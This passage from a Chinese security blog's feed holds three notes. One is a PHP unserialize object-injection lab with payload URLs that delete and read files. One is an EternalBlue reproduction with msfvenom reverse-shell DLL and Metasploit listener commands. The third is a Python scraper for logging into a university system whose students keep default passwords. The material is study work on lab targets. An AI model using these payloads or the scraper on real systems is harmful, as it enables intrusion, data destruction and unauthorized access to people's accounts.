<p>在其它脚本中我们可能找到一个unserialize的调用，并且参数是用户提供的。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">   </div><div class="line">include &apos;logfile.php&apos;;  </div><div class="line">   </div><div class="line">// ... 一些使用LogFile类的代码...  </div><div class="line">   </div><div class="line">// 简单的类定义  </div><div class="line">   </div><div class="line">class User  </div><div class="line">&#123;  </div><div class="line">    // 类数据  </div><div class="line">   </div><div class="line">    public $age = 0;  </div><div class="line">    public $name = &apos;&apos;;  </div><div class="line">   </div><div class="line">    // 输出数据  </div><div class="line">   </div><div class="line">    public function PrintData()  </div><div class="line">    &#123;  </div><div class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 重建用户输入的数据  </div><div class="line">   </div><div class="line">$usr = unserialize($_GET[&apos;usr_serialized&apos;]);  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>创建利用代码111.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"></div><div class="line">include &apos;logfile.php&apos;;  </div><div class="line"></div><div class="line">$obj = new LogFile();  </div><div class="line">$obj-&gt;filename = &apos;1.php&apos;;  </div><div class="line">   </div><div class="line">echo serialize($obj) . &apos;&lt;br /&gt;&apos;;  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226171240425" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}" target="_blank" rel="external">http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226171734880" alt=""></p>
<p>显示已经删除了1.php。验证一下，果然成功删除了。<br><img src="http://img.blog.csdn.net/20161226171852146" alt=""></p>
<p>这就是漏洞名称的由来：在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行或者其它坑爹的行为。先不谈 <strong>wakeup 和 </strong>destruct，还有一些很常见的注入点允许你利用这个类型的漏洞，一切都是取决于程序逻辑。举个例子，某用户类定义了一个<strong>toString为了让应用程序能够将类作为一个字符串输出(echo $obj)，而且其他类也可能定义了一个类允许</strong>toString读取某个文件。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line">   </div><div class="line">// … 一些include ...  </div><div class="line">   </div><div class="line">class FileClass  </div><div class="line">&#123;  </div><div class="line">    // 文件名  </div><div class="line">   </div><div class="line">    public $filename = &apos;error.log&apos;;  </div><div class="line">   </div><div class="line">    // 当对象被作为一个字符串会读取这个文件  </div><div class="line">   </div><div class="line">    public function __toString()  </div><div class="line">    &#123;  </div><div class="line">        return file_get_contents($this-&gt;filename);  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// Main User class  </div><div class="line">   </div><div class="line">class User  </div><div class="line">&#123;  </div><div class="line">    // Class data  </div><div class="line">   </div><div class="line">    public $age = 0;  </div><div class="line">    public $name = &apos;&apos;;  </div><div class="line">   </div><div class="line">    // 允许对象作为一个字符串输出上面的data  </div><div class="line">   </div><div class="line">    public function __toString()  </div><div class="line">    &#123;  </div><div class="line">        return &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">// 用户可控  </div><div class="line">   </div><div class="line">$obj = unserialize($_GET[&apos;usr_serialized&apos;]);  </div><div class="line">   </div><div class="line">// 输出__toString  </div><div class="line">   </div><div class="line">echo $obj;  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}" target="_blank" rel="external">http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226172759524" alt=""></p>
<p>但是如果我们用序列化调用FileClass呢?先建立一个1.txt。</p>
<p><img src="http://img.blog.csdn.net/20161226181346046" alt=""></p>
<p>创建利用代码123.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> </div><div class="line">include &apos;test.php&apos;;  </div><div class="line">$fileobj = new FileClass();  </div><div class="line">$fileobj-&gt;filename = &apos;1.txt&apos;;  </div><div class="line">   </div><div class="line">echo serialize($fileobj);  </div><div class="line">   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226174603949" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}" target="_blank" rel="external">http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226174705550" alt=""></p>
<p>成功显示了文本内容。也可以使用其他magic函数：如果对象将调用一个不存在的函数<strong>call将被调用；如果对象试图访问不存在的类变量</strong>get和__set将被调用。但是利用这种漏洞并不局限于magic函数，在普通的函数上也可以采取相同的思路。例如User类可能定义一个get方法来查找和打印一些用户数据，但是其他类可能定义一个从数据库获取数据的get方法，这从而会导致SQL注入漏洞。set或write方法会将数据写入任意文件，可以利用它获得远程代码执行。唯一的技术问题是注入点可用的类，但是一些框架或脚本具有自动加载的功能。最大的问题在于人：理解应用程序以能够利用这种类型的漏洞，因为它可能需要大量的时间来阅读和理解代码。</p>
<p>原文链接：<a href="http://blog.csdn.net/qq_32400847/article/details/53873275" target="_blank" rel="external">http://blog.csdn.net/qq_32400847/article/details/53873275</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>方程式 0day Eternalblue复现</title>
    <link href="http://uknowsec.cn/posts/notes/%E6%96%B9%E7%A8%8B%E5%BC%8F-0day-Eternalblue%E5%A4%8D%E7%8E%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/方程式-0day-Eternalblue复现.html</id>
    <published>2017-05-26T02:19:34.000Z</published>
    <updated>2017-05-26T02:57:26.682Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天去学长公司了，在公司呆了一下午。其间学长的同事让我复现下方程式Eternalblue，但是由于我没有带电脑所以没有在那边进行复现。Eternalblue之前我是有复现过的，那时候是用吐司上别人发的MSF集成的脚本。但是好像是成功了，回来打开KALI还看到之前的成功记录。这次再次进行一次复现，在这个过程中，一开始我是按照学长同事给的freebuf上的一篇文章来的，但是我最初下载的Empire是最新版的，然后在配置listeners的过程中出现错误，不能配置。无奈在他人的提醒下下载了1.6版本但是由于之前安装了最新版的问题，1.6无法安装。所以只能直接用msf进行监听了。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">攻击机 ： 10.15.17.215</div><div class="line">win7 32bit 旗舰版</div><div class="line">python-2.6.6.msi</div><div class="line">https://www.python.org/download/releases/2.6.6/</div><div class="line">pywin32-221.win32-py2.6.exe</div><div class="line">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg" alt=""></p>
<h3 id="监听机"><a href="#监听机" class="headerlink" title="监听机"></a>监听机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">监听机 ： 10.15.198.65</div><div class="line">KALI</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101141.jpg" alt=""></p>
<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">靶机 ： 10.15.251.226</div><div class="line">win 64bit en 旗舰版</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526100922.jpg" alt=""></p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h3><ul>
<li><p>在KALI下生成s.dll到apache目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.15.198.65 LPORT=5555 -f dll &gt; /var/www/html/s.dll</div></pre></td></tr></table></figure>
</li>
<li><p>启动apache服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 start</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101041.jpg" alt=""></p>
<h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/mulit/handler</div><div class="line">set LHOST 10.15.198.65</div><div class="line">set LPORT 5555</div><div class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""></p>
<h3 id="配置攻击脚本"><a href="#配置攻击脚本" class="headerlink" title="配置攻击脚本"></a>配置攻击脚本</h3><ul>
<li>运行fb.py 配置攻击脚本</li>
<li>访问KALI的web服务器下载s.dll文件复制到C盘目录</li>
<li>加载DLL</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101230.jpg" alt=""></p>
<h3 id="操作监听机"><a href="#操作监听机" class="headerlink" title="操作监听机"></a>操作监听机</h3><ul>
<li>Msf里成功收到一个shell</li>
<li>getuid</li>
<li>ipconfig</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101109.jpg" alt=""></p>
<h2 id="之前的复现图"><a href="#之前的复现图" class="headerlink" title="之前的复现图"></a>之前的复现图</h2><p>附上之前利用msf集成exp脚本测试图。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/_ZC1FX3$WP%5DCML2JTF8MMTT.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/~X%7D5U%7D5VQO@OPK%5BN$5~_Y%5DG.png" alt=""></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>昨天回来后休息了一会，然后才开始复现的，等我把环境配置好的时候已经断网了。Empire最新版无法配置listeners的问题一直没有解决。早上下载1.6版本有出现了错误，需要删除最新版。但是Empire是利用.sh安装的，想要卸载干净不是那么简单的。再加上我的KALI没有快照不能还原，无奈只能直接利用MSF，不能按照freebuf上的文章进行复现。然后自己的电脑也比较渣，开三个虚拟机一卡一卡的，陆陆续续才完成这个复现过程。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Python编程实践学习--模拟登录爬取信息</title>
    <link href="http://uknowsec.cn/posts/notes/python%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%88%AC%E5%8F%96%E4%BF%A1%E6%81%AF.html"/>
    <id>http://uknowsec.cn/posts/notes/python编程实践学习-模拟登录爬取信息.html</id>
    <published>2017-05-12T07:15:52.000Z</published>
    <updated>2017-05-12T09:58:08.397Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在安全牛看《简单学python安全》这套视频教材，然后自己也想写个小东西，恰巧学习的一个信息系统，同学们的账号密码都是默认的，而且没有验证码，相对简单。所以就开始了这个小脚本的编写历程。这个过程中遇到了不少问题，请教了学长，在学长的帮助和指导下完成。在此回顾总结下这次过程。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>一开始自己抓包分析的时候，出现了一些问题。登录过程分析得不够严谨，以致于模拟登录的时候出现不能登录上去的问题，后来学长帮我分析了下。原来这个模拟登录过程需要两个POST请求过程，而在这个过程中之前我使用的是urllib这个库来模拟登录，在学长的提示下使用request这个相较于urllib先进的库</p>
<h4 id="第一个POST包"><a href="#第一个POST包" class="headerlink" title="第一个POST包"></a>第一个POST包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /renzheng.jsp HTTP/1.1</div><div class="line">Host: xxxx.xxxx.edu.cn</div><div class="line">Content-Length: 142</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://xxxx.xxxx.edu.cn</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://xxxx.xxxx.edu.cn</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</div><div class="line">Connection: close</div><div class="line"></div><div class="line">displayName=&amp;displayPasswd=&amp;select=2&amp;submit.x=36&amp;submit.y=14&amp;operType=911&amp;random_form=-1048366953725273893&amp;userName=xxxxx&amp;passwd=xxxxx</div></pre></td></tr></table></figure>
<ul>
<li>从第一个包可以看出PostData部分由9各部分组成其中：</li>
<li>displayName、displayPasswd默认是空的</li>
<li>select、submit.x、submit.y这三个参数中，select是用户类型，如果是教师用户select=1,如果是学生用户select=2。submit.x、submit.y分别代表鼠标点击的坐标</li>
<li>operType、random_form这两个个参数中，operType默认为911，random_form是一个随机数字串</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
</ul>
<h4 id="第二个POST包"><a href="#第二个POST包" class="headerlink" title="第二个POST包"></a>第二个POST包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /servlet/adminservlet HTTP/1.1</div><div class="line">Host: xxxx.xxxx.edu.cn</div><div class="line">Content-Length: 65</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://xxxx.xxxx.edu.cn</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://xxxx.xxxx.edu.cn/renzheng.jsp</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</div><div class="line">Connection: close</div><div class="line"></div><div class="line">isValidate=false&amp;userName=xxxxx&amp;passwd=xxxxx&amp;operType=911</div></pre></td></tr></table></figure>
<ul>
<li>看Referer可以看出这个包是由第一个包的页面跳转过来的</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
<li>isValidate默认为false</li>
<li>operType默认为911</li>
</ul>
<h4 id="爬取页面GET包"><a href="#爬取页面GET包" class="headerlink" title="爬取页面GET包"></a>爬取页面GET包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /student/studentInfo.jsp?userName=xxxx&amp;passwd=xxxxx HTTP/1.1</div><div class="line">Host: xxxx.xxxx.edu.cn</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://xxxx.xxxx.edu.cn/servlet/adminservlet</div><div class="line">Accept-Encoding: gzip, deflate, sdch</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</div><div class="line">Connection: close</div></pre></td></tr></table></figure>
<ul>
<li>看Referer可以看出这个包是由第二个包的页面跳转过来的</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
</ul>
<h3 id="模拟构造请求包"><a href="#模拟构造请求包" class="headerlink" title="模拟构造请求包"></a>模拟构造请求包</h3><p>在写Python代码的过程我尝试着用了面向对象的过程，把相关变量定义为私有变量，在模拟登录的过程中使用到了Requests模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">__header = &#123;</div><div class="line">			&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</div><div class="line">			&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</div><div class="line">			&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">			&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</div><div class="line">			&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</div><div class="line">			&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</div><div class="line">	&#125;</div><div class="line">__data1 = &#123;</div><div class="line">			&apos;displayName&apos; : &apos;&apos;,</div><div class="line">	  		&apos;displayPasswd&apos; : &apos;&apos;,</div><div class="line">	  		&apos;select&apos;: &apos;2&apos;,</div><div class="line">	  		&apos;submit.x&apos;: &apos;43&apos;,</div><div class="line">	  		&apos;submit.y&apos; : &apos;12&apos;,</div><div class="line">	  		&apos;operType&apos; : &apos;911&apos;,</div><div class="line">	  		&apos;random_form&apos; : &apos;5129319019753764987&apos;,</div><div class="line">	 		&apos;userName&apos; : &apos;&apos;,</div><div class="line">	 		&apos;passwd&apos; : &apos;&apos;</div><div class="line">	&#125;</div><div class="line">__data2 = &#123;</div><div class="line">			&apos;isValidate&apos;:&apos;false&apos;,</div><div class="line">			&apos;userName&apos;:&apos;&apos;,</div><div class="line">			&apos;passwd&apos;:&apos;&apos;,</div><div class="line">			&apos;operType&apos;:&apos;911&apos;,</div><div class="line">	&#125;</div><div class="line">__posturl1 = &apos;http://xxxx.xxxx.edu.cn/renzheng.jsp&apos;</div><div class="line">__posturl2 = &apos;http://xxxx.xxxx.edu.cn/servlet/adminservlet&apos;</div><div class="line"></div><div class="line">__geturl = &apos;http://xxxx.xxxx.edu.cn/student/studentInfo.jsp?userName=&amp;passwd=&apos;</div></pre></td></tr></table></figure>
<h3 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h3><p>Requests是一个Python HTTP库，提供了很多与HTTP相关的方法，我们可以使用dir(requests)查看该库提供的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import requests</div><div class="line">&gt;&gt;&gt; dir(requests)</div><div class="line">[&apos;ConnectionError&apos;, &apos;HTTPError&apos;, &apos;NullHandler&apos;, &apos;PreparedRequest&apos;, &apos;Request&apos;, &apos;RequestException&apos;, &apos;Response&apos;, &apos;Session&apos;, &apos;Timeout&apos;, &apos;TooManyRedirects&apos;, &apos;URLRequired&apos;, &apos;__author__&apos;, &apos;__build__&apos;, &apos;__builtins__&apos;, &apos;__copyright__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__license__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__path__&apos;, &apos;__title__&apos;, &apos;__version__&apos;, &apos;adapters&apos;, &apos;api&apos;, &apos;auth&apos;, &apos;certs&apos;, &apos;codes&apos;, &apos;compat&apos;, &apos;cookies&apos;, &apos;delete&apos;, &apos;exceptions&apos;, &apos;get&apos;, &apos;head&apos;, &apos;hooks&apos;, &apos;logging&apos;, &apos;models&apos;, &apos;options&apos;, &apos;patch&apos;, &apos;post&apos;, &apos;put&apos;, &apos;request&apos;, &apos;session&apos;, &apos;sessions&apos;, &apos;status_codes&apos;, &apos;structures&apos;, &apos;utils&apos;]</div></pre></td></tr></table></figure>
<p>在这次过程中主要使用到了Session、get、post和content这几种方法</p>
<h4 id="Session会话对象"><a href="#Session会话对象" class="headerlink" title="Session会话对象"></a>Session会话对象</h4><p>会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; s = requests.Session()</div><div class="line">&gt;&gt;&gt; r = s.get(&quot;http://uknowsec.cn/&quot;)</div></pre></td></tr></table></figure>
<h4 id="GET提交方式"><a href="#GET提交方式" class="headerlink" title="GET提交方式"></a>GET提交方式</h4><p>以GET提交方式请求响应的URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; r = requests.get(&quot;http://uknowsec.cn/&quot;,proxies=proxies,timeout=0.001,params=payload)</div></pre></td></tr></table></figure>
<ul>
<li><p>params为GET提交方式传递参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload)</div></pre></td></tr></table></figure>
</li>
<li><p>proxies如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">proxies = &#123;</div><div class="line">  &quot;http&quot;: &quot;http://10.10.1.10:3128&quot;,</div><div class="line">  &quot;https&quot;: &quot;http://10.10.1.10:1080&quot;,</div><div class="line">&#125;</div><div class="line"></div><div class="line">requests.get(&quot;http://example.org&quot;, proxies=proxies)</div></pre></td></tr></table></figure>
<ul>
<li>requests在经过以 timeout 参数设定的秒数时间之后停止等待响应:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; requests.get(&apos;http://github.com&apos;, timeout=0.001)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;&quot;, line 1, in </div><div class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=&apos;github.com&apos;, port=80): Request timed out. (timeout=0.001)</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="POST提交方式"><a href="#POST提交方式" class="headerlink" title="POST提交方式"></a>POST提交方式</h4><p>以GET提交方式请求响应的URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">requests.post(&quot;http://example.org&quot;, header=header, data=data)</div></pre></td></tr></table></figure></p>
<ul>
<li>header是需要的header头部信息</li>
</ul>
<p><a href="http://obr4sfdq7.bkt.clouddn.com/2017-05-12_163012.png" target="_blank" rel="external">header头部信息</a></p>
<p>此处我们只需要添加常见的常见的部分即可</p>
